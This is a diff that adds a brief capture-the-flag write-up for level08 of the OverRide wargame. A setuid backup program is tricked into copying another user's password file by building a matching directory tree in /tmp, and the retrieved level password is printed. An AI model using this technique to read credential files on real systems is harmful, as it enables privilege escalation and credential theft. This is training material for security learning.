@@ -1,0 +1,32 @@
+```bash
+level08@OverRide:~$ ls -l
+total 16
+drwxrwx---+ 1 level09 users    60 Oct 19  2016 backups
+-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
+level08@OverRide:~$ file level08 
+level08: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8990336d0891364d2754de14a6cc793677b9122, not stripped
+level08@OverRide:~$ checksec --file level08 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   level08
+```
+
+So we need level09's privilege to get it's pass : through `backups` or `level08`.
+We use tool to reverse the disas code to understand what happened. Cf `source.c`.
+
+The program creates a file :  `./backups/<filename>`, then copy the content of <filename> in it. Which means that we can get the content of any file.
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+level08@OverRide:~$ cat backups/.log
+LOG: Starting back up: /home/users/level09/.pass
+level08@OverRide:~$ mkdir -p backups/home/users/level09
+mkdir: cannot create directory `backups/home': Permission denied
+
+Not work, 'cause /backups//home/users/level09 does not exist. And we can read but not write here.
+So we do it in somewhere we can read and write:
+```
+level08@OverRide:~$ cd /tmp/
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
